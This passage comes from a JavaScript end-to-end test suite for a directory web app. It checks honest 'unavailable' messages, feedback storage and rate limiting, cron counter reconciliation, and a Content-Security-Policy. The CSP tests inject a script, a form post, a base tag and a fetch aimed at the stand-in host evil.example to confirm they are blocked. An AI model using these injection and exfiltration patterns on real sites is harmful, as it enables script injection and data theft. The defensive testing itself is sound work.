  // (URLs beyond ~14 KB are refused by Node/Vercel before the app runs, so stay just under that)
  const huge = await http(`/api/favorites?ids=${Array.from({ length: 1800 }, (_, i) => `x${i}`).join(',')}`);
  check('favorites survives a very long id list (only the first 50 are looked at)', huge.status === 200 && Array.isArray((await huge.json()).listings));
  check('suggest endpoint responds', (await http('/api/suggest?q=Grace')).status === 200);
}

// ============================================================================
section('I. Features that cannot work say so (no fake success)');
// ============================================================================
{
  const eventsBefore = Number((await q('select count(*)::int as n from events')).rows[0].n);
  const ev = await http('/api/events', { method: 'POST', cookie: owner.cookie, form: { title: 'Picnic', date: '2030-01-01' } });
  check('event form: honest "unavailable" (was: "Event created and submitted for review")', location(ev) === '/dashboard/events?unavailable=1', location(ev));
  check('event form: anonymous → sign-in', location(await http('/api/events', { method: 'POST', form: { title: 'x' } })).startsWith('/auth/signin'));
  const evPage = await (await http('/dashboard/events?unavailable=1', { cookie: owner.cookie })).text();
  check('events page says nothing is saved and disables the form', evPage.includes('not saved') && evPage.includes('disabled'));
  check('no event row was created', Number((await q('select count(*)::int as n from events')).rows[0].n) === eventsBefore);

  const tax = await (await http('/admin/taxonomy', { cookie: admin.cookie })).text();
  check('taxonomy page has no fake "saved (demo)" form', !tax.includes('(demo)') && !tax.includes('/api/admin/taxonomy'));
  const vr = await (await http('/admin/verifications', { cookie: admin.cookie })).text();
  check('verification page no longer offers alert-only badge buttons', !/alert\(/.test(vr));

  // feedback: stored + throttled (was: email only, result ignored, no rate limit)
  const fb = (n) => http('/api/feedback', { method: 'POST', form: { category: 'Bug', message: `Suggestion number ${n} for the team.` } });
  const first = await fb(1);
  check('feedback accepted', location(first) === '/feedback?sent=1', location(first));
  check('feedback is stored in reports for the admin page', Number((await q("select count(*)::int as n from reports where reason like 'Feedback:%'")).rows[0].n) >= 1);
  const listed = await (await http('/admin/reports', { cookie: admin.cookie })).text();
  check('admin reports page lists the feedback', listed.includes('Feedback: Bug'));
  let throttled = false;
  for (let i = 2; i <= 7; i++) if (decodeURIComponent(location(await fb(i))).includes('Too many suggestions')) throttled = true;
  check('feedback is rate limited per network', throttled);
  check('feedback subject cannot smuggle header breaks', !/[\r\n]/.test((await q("select reason from reports where reason like 'Feedback:%' limit 1")).rows[0].reason));
}

// ============================================================================
section('K. Cron: rating counters are reconciled from the published reviews');
// ============================================================================
{
  // Production answers 401 unless CRON_SECRET is set; pass the same value to this script to run the check there.
  const cronHeaders = process.env.CRON_SECRET ? { authorization: `Bearer ${process.env.CRON_SECRET}` } : {};
  const probe = await http('/api/cron/search-index', { headers: cronHeaders });
  check('cron endpoint is protected (no bearer → 401 in production)', process.env.CRON_SECRET ? (await http('/api/cron/search-index')).status === 401 : probe.status === 200 || probe.status === 401, `status=${probe.status}`);
  if (probe.status === 401) {
    results.push('SKIP  cron reconcile: the server requires CRON_SECRET — pass it to this script to run the check');
  } else {
    await q('update listings set review_count = 99, avg_rating = 1.00 where id = $1', [reviewedListingId]);
    const run = await http('/api/cron/search-index', { headers: cronHeaders });
    const body = await run.json();
    check('cron reconcile corrects drifted counters (was: a console.log stub)', run.status === 200 && body.ok === true && body.corrected >= 1, JSON.stringify(body));
    const fixed = await row(reviewedListingId);
    check('…back to the truth (2 published reviews, average 4.00)', fixed.review_count === 2 && Number(fixed.avg_rating) === 4, `${fixed.review_count}/${fixed.avg_rating}`);
    const again = await (await http('/api/cron/search-index', { headers: cronHeaders })).json();
    check('…and a second run changes nothing', again.corrected === 0, JSON.stringify(again));
  }
  check('the no-op sitemap-ping cron endpoint is gone', (await http('/api/cron/refresh-sitemap', { headers: cronHeaders })).status === 404);
}

// ============================================================================
section('J. Content-Security-Policy in a real browser (the exact policy from vercel.json)');
// ============================================================================
{
  const config = JSON.parse(readFileSync(new URL('./vercel.json', import.meta.url), 'utf8'));
  const cspHeader = config.headers[0].headers.find((h) => h.key === 'Content-Security-Policy').value;
  // Over plain http the platform policy's `upgrade-insecure-requests` would rewrite every asset URL to https.
  const csp = cspHeader.split(';').map((d) => d.trim()).filter((d) => d && d !== 'upgrade-insecure-requests').join('; ');
  const listing = await createListing(owner, { name: uniq('CSP Probe'), website: 'https://example.com', showWebsite: true });

  const browser = await chromium.launch();
  try {
    const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
    await ctx.addCookies([
      { name: 'cl_session', value: owner.cookie.split('=')[1], url: BASE },
    ]);
    const adminCtx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
    await adminCtx.addCookies([{ name: 'cl_session', value: admin.cookie.split('=')[1], url: BASE }]);

    const withPolicy = async (context) =>
      context.route('**/*', async (route) => {
        if (!route.request().url().startsWith(BASE)) return route.continue();
        const response = await route.fetch({ maxRedirects: 0 });
        const headers = { ...response.headers() };
        if ((headers['content-type'] ?? '').includes('text/html')) headers['content-security-policy'] = csp;
        await route.fulfill({ response, headers });
      });
    await withPolicy(ctx);
    await withPolicy(adminCtx);

    const probe = async (context, path) => {
      const page = await context.newPage();
      const problems = [];
      await page.addInitScript(() => {
        window.__csp = [];
        document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ← ${e.blockedURI || e.sourceFile || 'inline'}`));
      });
      page.on('pageerror', (e) => problems.push(`pageerror: ${e.message}`));
      await page.goto(`${BASE}${path}`, { waitUntil: 'networkidle' });
      await page.waitForTimeout(400);
      // In `astro dev` the Vercel adapter loads Web Analytics from its CDN (production uses the first-party
      // /_vercel/insights/script.js, which 'self' covers), so that one blocked URL is expected outside production.
      const violations = (await page.evaluate(() => window.__csp)).filter((v) => !v.includes('cdn.vercel-insights.com'));
      await page.close();
      return { violations, problems };
    };

    const publicPages = ['/', '/search', '/search?ltype=industry:food-beverage', `/directory/${listing.slug}`, '/add-listing', '/auth/signin', '/auth/signup', '/about', '/events', '/favorites', '/browse/locations', '/claim-listing', '/contact', '/feedback'];
    const memberPages = ['/dashboard', '/dashboard/listings', '/dashboard/reviews', '/dashboard/events', '/dashboard/analytics', '/account'];
    const adminPages = ['/admin', '/admin/listings', '/admin/reviews', '/admin/users', '/admin/reports', '/admin/claims', '/admin/taxonomy'];
    for (const [context, pages] of [[ctx, publicPages], [ctx, memberPages], [adminCtx, adminPages]]) {
      for (const path of pages) {
        const { violations, problems } = await probe(context, path);
        check(`CSP: no violations and no page errors on ${path}`, violations.length === 0 && problems.length === 0, [...violations, ...problems].slice(0, 2).join(' | '));
      }
    }

    // …and the policy really does bite
    const page = await ctx.newPage();
    await page.addInitScript(() => {
      window.__csp = [];
      document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(e.violatedDirective));
    });
    await page.goto(`${BASE}/about`, { waitUntil: 'networkidle' });
    const blocked = await page.evaluate(async () => {
      const script = document.createElement('script');
      script.src = 'https://evil.example/steal.js';
      document.head.appendChild(script);
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'https://evil.example/collect';
      document.body.appendChild(form);
      try { form.submit(); } catch { /* blocked */ }
      const base = document.createElement('base');
      base.href = 'https://evil.example/';
      document.head.appendChild(base);
      try { await fetch('https://evil.example/exfil', { mode: 'no-cors' }); } catch { /* blocked */ }
      await new Promise((r) => setTimeout(r, 400));
      return window.__csp;
    });
    check('CSP blocks third-party scripts', blocked.some((d) => d.startsWith('script-src')), blocked.join(','));
    check('CSP blocks cross-origin form posts', blocked.includes('form-action'), blocked.join(','));
    check('CSP blocks <base> hijacking', blocked.includes('base-uri'), blocked.join(','));
    check('CSP blocks exfiltration via fetch', blocked.includes('connect-src'), blocked.join(','));
    await ctx.close();
    await adminCtx.close();
  } finally {
    await browser.close();
  }
}

await db.end();
console.log(results.join('\n'));
const fails = results.filter((r) => r.startsWith('FAIL')).length;
const total = results.filter((r) => /^(PASS|FAIL)/.test(r)).length;
console.log(`\n${total - fails}/${total} passed`);
process.exit(fails ? 1 : 0);
